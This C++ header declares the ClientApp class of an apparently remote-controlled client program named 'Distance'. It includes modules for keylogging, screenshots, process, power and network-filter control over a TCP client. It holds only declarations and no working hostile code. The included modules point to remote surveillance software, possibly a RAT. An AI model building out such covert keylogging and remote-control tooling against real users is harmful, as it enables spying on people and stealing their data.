#ifndef _DISTANCE_CLIENT_APP_HPP_
#define _DISTANCE_CLIENT_APP_HPP_

#include <iostream>
#include <cwctype>
#include <cassert>
#include <codecvt>

#include "Logger.hpp"
#include "TcpSyncClient.hpp"
#include "KeyloggerControl.hpp"
#include "ClientConfigurator.hpp"

#include "ComputerInfo.hpp"

#include "Screenshot.hpp"
#include "ProcessManager.hpp"
#include "PowerManager.hpp"
#include "NetfilterControl.hpp"

namespace Distance
{

    class ClientApp
    {
    public:
        ClientApp(const ClientApp&) = delete;
        void operator=(const ClientApp&) = delete;

        static ClientApp* create();
        void run();

    private:
        ClientApp() = default;

    private:
        boost::asio::io_context ioContext_;
        std::unique_ptr<wchar_t[]> mainBuffer_;

        std::unique_ptr<TcpSyncClient> client_;
        static ClientApp* app_;
        enum
        {
            MainBufferSize = 4096u * 2u
        };
    };

} // namespace Distance
#endif // _DISTANCE_CLIENT_APP_HPP_
